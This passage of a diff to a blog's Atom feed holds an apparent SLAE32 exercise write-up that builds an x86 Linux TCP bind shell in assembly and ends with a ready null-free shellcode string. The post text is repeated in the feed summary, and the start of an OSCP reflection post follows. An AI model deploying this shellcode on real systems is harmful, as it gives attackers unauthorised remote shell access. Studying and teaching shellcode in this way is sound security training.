+    int 0x80          ; final syscall
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;After dumping the hex from the executable, I noticed that there were a tonne of null bytes within the output - which is not good for our payload. In order to remove these, a second draft needs to be looked into and come up with a way to use the same instructions with no null bytes remaining.&lt;/p&gt;
+
+&lt;h2 id=&quot;second-draft&quot;&gt;Second Draft:&lt;/h2&gt;
+&lt;p&gt;After playing around with the script for a while and testing a few things, I was able to narrow down the total instructions needed to still successfully create a working TCP bind shell. The instructions removed are relatively trivial, but it will help pull down the overall byte size of the hex payload. The main changes I made to the assembly were:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;removed all xor instructions used to clear a register before moving a value into it
+    &lt;ul&gt;
+      &lt;li&gt;I realised that the mov instruction seems to just overwrite the value, no need to 0 it&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;removed the 3 separate dup2 chunks and instead added a decrementing loop, using the value of the counter as the 2nd parameter value in ECX&lt;/li&gt;
+  &lt;li&gt;when using a register to move values into them, use the lower half of the register only
+    &lt;ul&gt;
+      &lt;li&gt;For example, EAX becomes AL or AX (depending on the size of the value), EBX becomes BL, and so on.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The total source can be seen here:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;global  _start
+section .text
+
+_start:
+    ; SOCKET SYSCALL
+    mov eax, 0x167
+    mov ebx, 0x2
+    mov ecx, 0x1
+
+    int 0x80
+    mov edi, eax
+
+    ; BIND syscall
+    mov eax, 0x169
+    mov ebx, edi
+
+    ; create our sockaddr struct in memory, used with bind() call, 2nd param
+    xor ecx, ecx
+    push ecx
+    push ecx
+    push word 0x2923
+    push word 0x2
+
+    mov ecx, esp
+    mov edx, 16
+    int 0x80
+
+    ; LISTEN syscall 363
+    mov eax, 0x16b
+    mov ebx, edi
+    xor ecx, ecx
+    int 0x80
+
+    ; ACCEPT syscall 364
+    mov eax, 0x16c
+    mov ebx, edi
+    xor ecx, ecx
+    xor edx, edx
+    int 0x80
+    mov edi, eax         ; back up the fd value in edi again
+
+    ; DUP2 syscall (3 times)
+    mov ecx, 0x3         ; set counter register to 3 for counting down in the loop
+
+    for_loop_dup2:
+    mov eax, 0x3f
+    mov ebx, edi
+    dec ecx              ; decrement our counter before the syscall (should be 2, 1, 0)
+    int 0x80
+    
+    jnz for_loop_dup2    ; if count is not 0, jump back to the start of the loop
+
+    ; EXECVE() syscall
+    xor eax, eax
+    push eax
+
+    push 0x68732f6e
+    push 0x69622f2f
+    mov ebx, esp
+
+    push eax
+    mov ecx, esp
+
+    push eax
+    mov edx, esp
+
+    mov eax, 0xb
+    int 0x80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Dumping the hex for usage:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/slae32/misc# cat dump_hex.sh 
+objdump -d &quot;$1&quot; |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/&quot;/'|sed 's/$/&quot;/g'
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Usage:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/slae32/misc/second_bind_shell# ../dump_hex.sh second_bind_shell
+&quot;\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc7\x66\xb8\x69\x01\x89\xfb\x31\xc9\x51\x51\x66\x68\x23\x29\x66\x6a\x02\x89\xe1\xb2\x10\xcd\x80\x66\xb8\x6b\x01\x89\xfb\x31\xc9\xcd\x80\x66\xb8\x6c\x01\x89\xfb\x31\xc9\x31\xd2\xcd\x80\x89\xc7\xb1\x03\xb0\x3f\x89\xfb\x49\xcd\x80\x75\xf7\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As the above output shows, I have successfully tweaked my initial bind shell script to remove all null bytes during the second draft of the shell.&lt;/p&gt;
+
+&lt;h2 id=&quot;custom-port-number&quot;&gt;Custom port number:&lt;/h2&gt;
+&lt;p&gt;The issue with this shell at the moment, is the static port value used within the defined struct. In order to change the port number we currently need to either open the .asm file, tweak the hex number that is pushed onto the stack and rebuild the shell or remember which hex values in the entire hex string above reference the port.&lt;/p&gt;
+
+&lt;p&gt;The more logical solution would be to create a little tool, or wrapper, that takes a user defined integer value, converts this value to hex and then replaces the current port number value before dumping the hex to the screen for use.&lt;/p&gt;
+
+&lt;p&gt;todo - write python wrapper and place here&lt;/p&gt;
+
+&lt;h2 id=&quot;additional&quot;&gt;Additional:&lt;/h2&gt;
+&lt;p&gt;todo&lt;/p&gt;</content><author><name>Crawl3r</name></author><summary type="html">Introduction: The first SLAE32 exercise that required a write up was the x86 bind shell, written from scratch. As we know, or may not know, a bind shell does what it says in the name. It binds a shell. Unlike a reverse shell, the process sets up a listener on the host and waits for a connection, once accepted it fires off our new process and pipes the connection through allowing commands to be sent from a remote system and return the output. Brief thoughts: The actual implementation of the TCP bind shell was relatively straight forward. Using a C based prototype I was able to make a list of required system calls and utilise the Linux man pages to confirm the arguments and how they would need to appear and be set up within the asm file. An important thing to remember is null bytes are bad. We don’t want these to exist in our final project so simple tricks were used to get around these (i.e xor’ing registers with themselves to zero them). These will be highlighted when, and where, they are used. ## Initial planning: To begin with, I needed to know how a TCP bind shell would be implemented in C. As I had just been looking through h0mbre_’s github write ups, I remembered they included a simple one so I used this as my base reference. #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;strings.h&amp;gt; #include &amp;lt;sys/socket.h&amp;gt; #include &amp;lt;netinet/in.h&amp;gt; int main(void) { int listen_sock = socket(AF_INET, SOCK_STREAM, 0); struct sockaddr_in server_addr; server_addr.sin_family = AF_INET; server_addr.sin_addr.s_addr = INADDR_ANY; server_addr.sin_port = htons(9001); bind(listen_sock, (struct sockaddr *)&amp;amp;server_addr, sizeof(server_addr)); listen(listen_sock, 0); int conn_sock = accept(listen_sock, NULL, NULL); dup2(conn_sock, 0); dup2(conn_sock, 1); dup2(conn_sock, 2); execve(&quot;/bin/sh&quot;, NULL, NULL); } Once I had this, I was easily able to highlight the required system calls and start to gather the information I need to rebuild this is assembly. Utilising the Linux man pages and the Linux headers I crafted the following table which includes the syscall name, the C declaration (including parameters, types and return values) as well as the syscall number. This information may seem a little overkill right now, but it will become obvious when implementing the calls themselves later on in this write up. The following table lists the 6 system calls that are required to write our bind shell: System Call C Definition Return Value Syscall Number socket int socket(int domain, int type, int protocol); File descriptor for the new socket. 359 (0x167) bind int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen); n/a 361 (0x169) listen int listen(int sockfd, int backlog); n/a 363 (0x16b) accept int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen); File descriptor for the new socket. 364 (0x16c) dup2 int dup2(int oldfd, int newfd); n/a 63 (0x3f) execve int execve(const char *pathname, char *const argv[], char *const envp[]); n/a 11 (0xb) In order to create the above table, I used the following command with each syscall to obtain the C definition and return values from the linux manual pages: man 2 &amp;lt;function_name&amp;gt; As well as this, I used the following command to obtain the syscall value used within assembly to call the correct function: cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep &amp;lt;function_name&amp;gt; Crafting our shell (first draft): First things first, we want to create the skeleton of our script (first_bind_shell.asm): global _start section .text _start: ; zero out the common registers that we are likely to use xor eax, eax xor ebx, ebx xor ecx, ecx xor edx, edx With close reference to the C script included above, we can begin crafting our system calls in their required order. Ensuring the registers are set up correctly relative to the required parameters. The first syscall required is the socket() call. This will create our TCP socket and return a value that we must keep track of, the file descriptor. As this is our first syscall, I will break down the function and the registers required in order to successfully call it. The function description is int socket(int domain, int type, int protocol); and as we can see, the function is used in the following manner in C int listen_sock = socket(AF_INET, SOCK_STREAM, 0); From this we can identify the required steps in assembly from a pseudo code perspective: Set the EAX register to hold the value of the syscall Set the EBX register to hold the value of our first parameter (AF_INET) Set the ECX register to hold the value of our second parameter (SOCK_STREAM) Set the EDX register to hold the value of our third parameter (0) Perform the syscall Store the return value held in the EAX register after the syscall Each one of these steps seems pretty simple to implement in assembly using ‘mov’ to place the correct values in the registers and ‘int 0x80’ to execute the syscall. The only information missing are the actual values for AF_INET and SOCK_STREAM, in C these are already defined with their integer values however, here we need the raw integer value. The easiest way to get these values would have been to ask my good friend Google. He seems pretty knowledgable but instead I thought I might as well utilise the C types and dump their raw value. #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;sys/socket.h&amp;gt; int main(void){ printf(&quot;AF_INET: %d\n&quot;, AF_INET); printf(&quot;SOCK_STREAM: %d\n&quot;, SOCK_STREAM); return 0; } Compile and run: root@kali:~/Documents/slae32/misc# gcc test.c root@kali:~/Documents/slae32/misc# ./a.out AF_INET: 2 SOCK_STREAM: 1 Now we have all the required information, we can set up our target registers correctly and perform our first system call to socket. Looking back at our pseudo code above, we can translate it into the following x86 assembly: ; SOCKET SYSCALL ; set up the registers mov eax, 0x167 mov ebx, 0x2 mov ecx, 0x1 int 0x80 ; execute the syscall mov edi, eax ; store the return value in edi for future ref ; above pinched from h0mbre_ We set EAX to equal 0x167 (359), this is the value used later when the ‘int 0x80’ instruction is hit, which performs the actual syscall to socket. We now want to set up the EBX and ECX registers to hold the parameter values for our call. We set EBX to equal 0x2 (value of AF_INET), and ECX to 0x1 (value of SOCK_STREAM). We can now execute our system call. Registers before the call: gef➤ i r eax 0x167 0x167 ecx 0x1 0x1 edx 0x0 0x0 ebx 0x2 0x2 Registers after the call: gef➤ i r eax 0x3 0x3 ecx 0x1 0x1 edx 0x0 0x0 ebx 0x2 0x2 As we mentioned before. The return value for socket() is stored in the EAX. We can see above that this value is 0x3 (3). This is now our file descriptor and should be used throughout the program within some of the other system calls: bind() listen() accept() We can safely keep track of this value by storing it in a register we are unlikely going to use, preventing the value from being corrupted and overwritten. This is done by the final instruction ‘mov edi, eax’. Whilst writing this, I was following the execution in gdb - confirming the registers were working the way I wanted them too and the correct call was being made. Once confirmed, it was time to move on to the next syscall - bind(). Compared to the socket() system call, the bind() call requires quite a few more instructions to function correctly, including setting up the registers and pushing data onto the stack in the correct order, allowing to gain an address to use as a parameter. Looking at the C implementation of bind(), we can see 2 main sections of code include the creation of the ‘server_addr struct’ and the call to bind() itself. struct sockaddr_in server_addr; server_addr.sin_family = AF_INET; server_addr.sin_addr.s_addr = INADDR_ANY; server_addr.sin_port = htons(9001); bind(listen_sock, (struct sockaddr *)&amp;amp;server_addr, sizeof(server_addr)); The first thing we want to do is make sure the EAX register holds the syscall number (361) ready for the execution, we can do this by placing 0x169 into the register. We then want to set our 1st parameter (EBX) to equal the file descriptor returned by the socket() function. Remember, this was stored in EDI. We now need our 2nd parameter (ECX) to point to a collection of data in memory that includes the AF_INET, INADDR_ANY and the target port number. To break this down further, we need to obtain our raw values for the following: AF_INET INADDR_ANY Port value (string) in hex The size of the structure itself Similar to before, I created a small C program to print these values to the screen: #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;sys/socket.h&amp;gt; #include &amp;lt;netinet/in.h&amp;gt; int main(void){ struct sockaddr_in server_addr; server_addr.sin_family = AF_INET; server_addr.sin_addr.s_addr = INADDR_ANY; server_addr.sin_port = htons(9001); printf(&quot;AF_INET: %d\n&quot;, server_addr.sin_family); printf(&quot;INADDR_ANY: %d\n&quot;, server_addr.sin_addr.s_addr); printf(&quot;SIZE OF: %d\n&quot;, sizeof(server_addr)); return 0; } Compiling and executing the script gave me the following information: root@kali:~/Documents/slae32/misc# ./b.out AF_INET: 2 INADDR_ANY: 0 SIZE OF: 16 Now we know the AF_INET value, the INADDR_ANY value and the size of the completed struct - we can implement our own struct, push the data onto the stack correctly and obtain the address of this collection of data. The struct itself actually contains 4 different values, which can be seen in the below definition taken from https://www.cs.cmu.edu/~srini/15-441/S10/lectures/r01-sockets.pdf: struct sockaddr_in { short sin_family; // e.g. AF_INET ‏)3490(unsigned short sin_port; // e.g. htons struct in_addr sin_addr; // see struct in_addr, below char sin_zero[8]; // zero this if you want to }; So now we know that the data we need to structure within our assembly is the following: AF_INET (2) The port number (I used 9001 - 0x2329) The address (0.0.0.0 as we are locally binding) 0 The address of this data structure needs to be placed in the 2nd parameter (ECX), luckily the ESP currently points to this data. We need to remember that the port number is of type string, and therefore should be pushed onto the stack as a “word”. With the final addition of the size being placed into the 3rd parameter (EDX), the bind system call is ready to be executed. ; BIND syscall xor eax, eax ; zero out eax mov eax, 0x169 ; move 361 into syscall register mov ebx, edi ; move fd (edi val) into ebx - param 1 ; create our sockaddr struct in memory, used with bind() call, 2nd param xor ecx, ecx push ecx ; 0 push ecx ; Address (0.0.0.0) push word 0x2923 ; port number (9001) push word 0x2 ; AF_INET mov ecx, esp ; pointer to struct mov edx, 16 ; size of struct int 0x80 Now we are ready to implement our call to listen(). Looking at the C implementation above, listen(listen_sock, 0); we can see that we require our EBX register (1st parameter) to equal the value of our file descriptor returned from socket() and our ECX register (2nd parameter) should be equal to 0 before making our call to listen(). In addition to the parameter values, we want to make sure EAX holds the value to the correct system call (363) before calling ‘int 0x80’. This should all look like the following: ; LISTEN SYSCALL xor eax, eax mov eax, 0x16b mov ebx, edi xor ecx, ecx int 0x80 Next we want to implement our call to accept() which will appear very similar to the listen() call above. Looking at the C implementation, we see it’s usage as int conn_sock = accept(listen_sock, NULL, NULL);. Once again, we require EAX to equal our syscall value (364), we need our first parameter (EBX) to equal our file descriptor from our socket() call, we then need our 2nd (ECX) and 3rd (EDX) parameters to both equal 0. Finally, we execute our system call with ‘int 0x80’. ; ACCEPT SYSCALL xor eax, eax mov eax, 0x16c mov ebx, edi xor ecx, ecx xor edx, edx int 0x80 Similar to socket(), the accept() call returns a file descriptor value to use within our final syscall, dup2(). We want to make sure we keep track of this value so we overwrite our previous file descriptor value stored in the EDI register. xor edi, edi mov edi, eax The next system call we need is dup2(). The following implementation was written to replicate the C code above, so there are 3 chunks of assembly that are pretty much the same except for one value. This could be cleaned up using a loop, but at this time, I just wanted the code to work. Looking at the C implementation, we see the following: dup2(conn_sock, 0); dup2(conn_sock, 1); dup2(conn_sock, 2); Looking at this, we need 3 separate calls to dup2() with 3 different values in the 2nd parameter (0, 1 and 2). For each call, we want to make sure our EAX value holds the value of our syscall (63), the 1st parameter requires the value of our file descriptor received from the accept() call above. The 2nd parameter is the value that needs to be set to 0, 1 and 2 across the 3 seperate calls. Finally, the ‘int 0x80’ is called to execute each system call. My approach at performing these three calls can be seen below: ; DUP2 SYSCALL xor eax, eax mov eax, 0x3f mov ebx, edi xor ecx, ecx int 0x80 xor eax, eax mov eax, 0x3f mov ebx, edi xor ecx, ecx mov ecx, 0x1 int 0x80 xor eax, eax mov eax, 0x3f mov ebx, edi xor ecx, ecx mov ecx, 0x2 int 0x80 By now, our process should have opened a socket, listened for a connection, accepted the incoming connection and set up our pipes into our process. We now want to implement our final system call, which actually gives this entire program any sense of purpose and use, the execve() call. This function allows us to execute our actual shell “/bin/sh”, giving us control over the target. Within the C implementation, the execve call is used like execve(“/bin/sh”, NULL, NULL);. Before implementing this in assembly, there is something we need to remember from the manual page and our table above. The manual shows the implementation and it’s parameters as: int execve(const char *pathname, char *const argv[], char *const envp[]); We can see that the 3 parameters all point to strings (pointers to chars/char arrays). Previously, we could simply set the value of the register to 0, however after attempting to do this for this system call I received errors during execution. After debugging the process for a little while, I tested pointing to nothing on the stack instead of simply setting the register to zero. That way, the register would be a pointer to a memory location, which held nothing. Sounds like a pointer to NULL to me! The final thing we need to have is the 1st parameter, which is actually the path to the file we would like to the execute. In this case, I used “/bin/sh”. This was achieved by getting the hex equivalent of this string, flipping it (Little Endian) and pushing it on the stack in 2 chunks. In step by steps, this what it looks like: “/bin/sh” in hex is 0x2f 0x62 0x69 0x6e 0x2f 0x73 0x68 we flip these because it’s little endian we push the two chunks on separately 0x68732f6e, 0x69622f We then need the address of the string to be placed into the first parameter (EBX). Luckily, the string is at the top of the stack and there is a register that holds this address ready for use, ESP. We can set the value of EBX to the value of ESP and achieve this. This can be completed in x86 using the following instructions: push 0x68732f6e ; hs/n push 0x69622f2f ; ib// mov ebx, esp Now we need our 2nd (ECX) and 3rd (EDX) parameters to point to NULL values. As I stated above, I initially attempted to just 0 out the registers - however this did not work. So I ended up pushing a zero on to the stack and using the address held in ESP again to reference the top of the stack, which pointed at our zero value after the push. This was completed twice to satisfy both NULL parameters. Finally, I set the EAX register to the value 0xb (11), which is the value of the execve system call, and executed it with the ‘int 0x80’ instruction. xor eax, eax push eax push 0x68732f6e push 0x69622f2f mov ebx, esp push eax mov ecx, esp push eax mov edx, esp xor eax, eax mov eax, 0xb int 0x80 We should now have a fully functioning TCP bind shell, ready for assembling, linking and executing. When connecting to the bind shell, remember the port number specified in the structure created and used within the bind() system call. I created a quick little script to help with assembling and linking my scripts, rather than having to issue 2 separate commands each time: root@kali:~/Documents/slae32/misc# cat build.sh echo &quot;Assembling $1.asm&quot; nasm -f elf32 &quot;$1&quot;.asm echo &quot;Linking $1.o&quot; ld -s -o &quot;$1&quot; &quot;$1&quot;.o echo &quot;Done&quot; Usage: ./build.sh tcp_bind_shell Upon assembling and linking the asm file, you should have a functional TCP bind shell. The entire first draft script can be seen here: global _start section .text _start: ; clear out the registers by xor-ing them with themselves. 0 without null bytes xor eax, eax xor ebx, ebx xor ecx, ecx xor edx, edx ; SOCKET SYSCALL ; int socket(int domain, int type, int protocol); ; socket is the first syscall we want with syscall number is 359 (0x167) ; EAX = syscall number, ebx = param 1 (2), ecx = param 2 (1), edx = param 3 (0) ; return's our fd value to EAX, we want to keep this mov eax, 0x167 mov ebx, 0x2 mov ecx, 0x1 ; we don't do anything with edx as 0 already exists from the xor above int 0x80 ; this interrupt signal handles the syscall mov edi, eax ; store the return value in edi for future ref ; BIND syscall ; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen); xor eax, eax ; zero out eax mov eax, 0x169 ; move 361 into syscall register mov ebx, edi ; move fd (edi val) into ebx - param 1 ; create our sockaddr struct in memory, used with bind() call, 2nd param xor ecx, ecx ; zero out ecx push ecx ; push the 0 onto the stack (4th struct value) push ecx ; push the 0 onto the stack (Address) push word 0x2923 ; push the port onto stack (0x2329) (PORT NUM = 9001) push word 0x2 ; push 2 onto the stack (AF_INET) mov ecx, esp ; store the current stack pointer into ecx, points at struct mov edx, 16 ; this parameter takes the length of the addr (param 3) int 0x80 ; syscall ; LISTEN syscall 363 ; int listen(int sockfd, int backlog); xor eax, eax ; zero out eax mov eax, 0x16b ; move 363 into register (syscall number) mov ebx, edi ; this should still be return val from socket() -&amp;gt; fd xor ecx, ecx ; clean out ecx as the 2nd param value should be 0 int 0x80 ; syscall ; ACCEPT syscall 364 ; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen); ; we want the return value from EAX (fd update) xor eax, eax ; zero out eax mov eax, 0x16c ; move 364 into register (syscall number) mov ebx, edi ; this should still be return val from socket() -&amp;gt; fd xor ecx, ecx ; zero out 2nd param (NULL) xor edx, edx ; zero out 3rd param (NULL) int 0x80 ; syscall ; accept() returns a new fd value, so let's store this one off too xor edi, edi ; 0 out edi before backing up fd mov edi, eax ; back up the fd value in edi again ; DUP2 syscall (3 times) ; int dup2(int oldfd, int newfd); xor eax, eax ; zero out eax mov eax, 0x3f ; move 63 into register (syscall number) mov ebx, edi ; move fd into 1st param (from accept) xor ecx, ecx ; zero out 2nd param (0) int 0x80 ; syscall (1st) xor eax, eax ; zero out eax mov eax, 0x3f ; move 63 into register (syscall number) mov ebx, edi ; move fd into 1st param (from accept) xor ecx, ecx ; zero out 2nd param (0) mov ecx, 0x1 ; move 1 into 2nd param int 0x80 ; syscall (2nd) xor eax, eax ; zero out eax mov eax, 0x3f ; move 63 into register (syscall number) mov ebx, edi ; move fd into 1st param (from accept) xor ecx, ecx ; zero out 2nd param (0) mov ecx, 0x2 ; move 2 into 2nd param int 0x80 ; syscall (3rd) ; EXECVE() syscall ; int execve(const char *pathname, char *const argv[], char *const envp[]); ; NOTE, param 2 and 3 are pointers to strings. XOR, PUSH then point to STACK in register xor eax, eax ; zero out eax ready for pushing 0s on to the stack push eax ; push first zero on, align the stack? ; &quot;/bin/sh&quot; in hex is 0x2f 0x62 0x69 0x6e 0x2f 0x73 0x68 ; we flip these because it's little endian ; 0x68732f6e, 0x69622f push 0x68732f6e push 0x69622f2f ; note the // at the end, sigsevs without - junk corrupting it? mov ebx, esp ; push the addr of our above string (esp) into 1st param push eax ; push 0 onto the stack (2nd param == NULL) mov ecx, esp ; requires a pointer - man page has them for usage push eax ; push 0 onto the stack (3rd param == NULL) mov edx, esp ; requires a pointer - man page has them for usage xor eax, eax ; zero out eax mov eax, 0xb ; move 11 into EAX register (syscall number) int 0x80 ; final syscall After dumping the hex from the executable, I noticed that there were a tonne of null bytes within the output - which is not good for our payload. In order to remove these, a second draft needs to be looked into and come up with a way to use the same instructions with no null bytes remaining. Second Draft: After playing around with the script for a while and testing a few things, I was able to narrow down the total instructions needed to still successfully create a working TCP bind shell. The instructions removed are relatively trivial, but it will help pull down the overall byte size of the hex payload. The main changes I made to the assembly were: removed all xor instructions used to clear a register before moving a value into it I realised that the mov instruction seems to just overwrite the value, no need to 0 it removed the 3 separate dup2 chunks and instead added a decrementing loop, using the value of the counter as the 2nd parameter value in ECX when using a register to move values into them, use the lower half of the register only For example, EAX becomes AL or AX (depending on the size of the value), EBX becomes BL, and so on. The total source can be seen here: global _start section .text _start: ; SOCKET SYSCALL mov eax, 0x167 mov ebx, 0x2 mov ecx, 0x1 int 0x80 mov edi, eax ; BIND syscall mov eax, 0x169 mov ebx, edi ; create our sockaddr struct in memory, used with bind() call, 2nd param xor ecx, ecx push ecx push ecx push word 0x2923 push word 0x2 mov ecx, esp mov edx, 16 int 0x80 ; LISTEN syscall 363 mov eax, 0x16b mov ebx, edi xor ecx, ecx int 0x80 ; ACCEPT syscall 364 mov eax, 0x16c mov ebx, edi xor ecx, ecx xor edx, edx int 0x80 mov edi, eax ; back up the fd value in edi again ; DUP2 syscall (3 times) mov ecx, 0x3 ; set counter register to 3 for counting down in the loop for_loop_dup2: mov eax, 0x3f mov ebx, edi dec ecx ; decrement our counter before the syscall (should be 2, 1, 0) int 0x80 jnz for_loop_dup2 ; if count is not 0, jump back to the start of the loop ; EXECVE() syscall xor eax, eax push eax push 0x68732f6e push 0x69622f2f mov ebx, esp push eax mov ecx, esp push eax mov edx, esp mov eax, 0xb int 0x80 Dumping the hex for usage: root@kali:~/Documents/slae32/misc# cat dump_hex.sh objdump -d &quot;$1&quot; |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/&quot;/'|sed 's/$/&quot;/g' Usage: root@kali:~/Documents/slae32/misc/second_bind_shell# ../dump_hex.sh second_bind_shell &quot;\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc7\x66\xb8\x69\x01\x89\xfb\x31\xc9\x51\x51\x66\x68\x23\x29\x66\x6a\x02\x89\xe1\xb2\x10\xcd\x80\x66\xb8\x6b\x01\x89\xfb\x31\xc9\xcd\x80\x66\xb8\x6c\x01\x89\xfb\x31\xc9\x31\xd2\xcd\x80\x89\xc7\xb1\x03\xb0\x3f\x89\xfb\x49\xcd\x80\x75\xf7\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80&quot; As the above output shows, I have successfully tweaked my initial bind shell script to remove all null bytes during the second draft of the shell. Custom port number: The issue with this shell at the moment, is the static port value used within the defined struct. In order to change the port number we currently need to either open the .asm file, tweak the hex number that is pushed onto the stack and rebuild the shell or remember which hex values in the entire hex string above reference the port. The more logical solution would be to create a little tool, or wrapper, that takes a user defined integer value, converts this value to hex and then replaces the current port number value before dumping the hex to the screen for use. todo - write python wrapper and place here Additional: todo</summary></entry><entry><title type="html">Before, During &amp;amp; After my OSCP</title><link href="http://localhost:4000/2019-03-03/before_during_after_oscp" rel="alternate" type="text/html" title="Before, During &amp; After my OSCP" /><published>2019-03-03T00:00:00+00:00</published><updated>2019-03-03T00:00:00+00:00</updated><id>http://localhost:4000/2019-03-03/before_during_after_oscp</id><content type="html" xml:base="http://localhost:4000/2019-03-03/before_during_after_oscp">&lt;p&gt;I passed my OSCP in June 2018, so this post is a little late. But honestly, I figured everyone else writes one almost immediately, fuelled by the joy/sadness of receiving the email from OffSec. I did think about writing one straight away but I didn’t really know how it would differ to anyone else… “I passed. Exam was hard. Labs was fun. Well worth it. Woooooh.”&lt;/p&gt;
+
+&lt;p&gt;So a few months down the line, I figured I could post some points about my personal experience with OffSec’s PWK course (and ultimately, the very popular OSCP certification). I don’t really want to sit here and recommend resources and pre-requisites for everyone to be able to one shot the exam. These kind of blogs can be found with a simple Google, infact – some people even dump an entire A-Z on Github, so I’m sure if you’re good enough at Google then you’ll find it. However, that’d ruin the whole experience (in my opinion).&lt;/p&gt;
+
+&lt;p&gt;The following sections of this post contain 3 main topics “Before”, “During” and “After” my time with OffSec, what I learnt and any recommendations I have regarding the entire course and exam. Again, to reiterate – this won’t be a “Do this box on Vulnhub and you’ll pass”, it’s more of a holistic view of everything around gaining your OSCP certification. As well as these 3 main sections, I will break down my course purchase and conclude with any final thoughts.&lt;/p&gt;
+
+&lt;h2 id=&quot;a-quick-breakdown&quot;&gt;A quick breakdown&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;Lab time purchased:&lt;/strong&gt; 90 days&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Started:&lt;/strong&gt; March 2018&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Exam:&lt;/strong&gt; End of May 2018&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Exam Attempts:&lt;/strong&gt; 1&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Additional:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Completed the lab report as soon as I could (possibility for extra marks)&lt;/li&gt;
+  &lt;li&gt;Spent ~2 hours a day chipping away due to work and University&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;before-my-lab-time&quot;&gt;Before my lab time&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Started from scratch** on Hack the Box (HTB), and just about reached the ‘Pro Hacker’ rank.&lt;/li&gt;
+  &lt;li&gt;I’d been to 1 face to face CTF which I was terrible at.&lt;/li&gt;
+  &lt;li&gt;I had dabbled with very basic Buffer Overflows (no ROP, Ret2LibC, Canaries, DEP, ASLR etc).&lt;/li&gt;
+  &lt;li&gt;Had very limited knowledge of web exploitation (xss, no sqli).&lt;/li&gt;
+  &lt;li&gt;Awful at enumeration (pre and post), I successfully missed obvious things a lot.&lt;/li&gt;
+  &lt;li&gt;I thought long sessions of hacking and energy drinks were a good idea.&lt;/li&gt;
+  &lt;li&gt;I knew C, a bit of Python, no bash, and my Kali (linux overall) skills were limited (I knew various other languages which were of no use here…)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;** When I say scratch… I mean scratch. I was googling how to ‘scan ports’ and ‘how to hack WordPress.’ I didn’t even know what a reverse shell was, I just knew I wanted to get one. Trust me, I was clueless.&lt;/p&gt;
+
+&lt;h2 id=&quot;during-my-lab-time&quot;&gt;During my lab time&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Enumeration became the key to my lab success.&lt;/li&gt;
+  &lt;li&gt;The PWK course material carried me through the lab.&lt;/li&gt;
+  &lt;li&gt;I used the rubber duck approach with non-technical beings. I talked to my lizard, tarantula and girlfriend about various systems and my approach, receiving 0 feedback. This made me explain it further and further until the answer was literally on the tip of my tongue. (Great technique for debugging code too!)
+*Metasploit wasn’t the only option (99.9% of the time).&lt;/li&gt;
+  &lt;li&gt;C, Python, Bash and (minor) x86 asm is your friend.&lt;/li&gt;
+  &lt;li&gt;The “try harder” attitude didn’t really help me, unless it’s used in a sense of “you’re at the right door, just keep trying”. When it’s some kid who can’t even sign up on HtB spamming it on discord, it’s just not worth reading it.&lt;/li&gt;
+  &lt;li&gt;Custom cheat sheets for my own tools/scripts, enumeration methods and overflow techniques really helped relieve stress when it came to using them against a target.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;after-i-received-my-pass&quot;&gt;After I received my “pass”&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;A nice sleep during the exam was literally all I needed.&lt;/li&gt;
+  &lt;li&gt;Enumeration WAS (and still is) the key to my “success”.&lt;/li&gt;
+  &lt;li&gt;Energy drinks just increased palpitations, eat and drink healthier stuff throughout. Don’t enhance your stress!&lt;/li&gt;
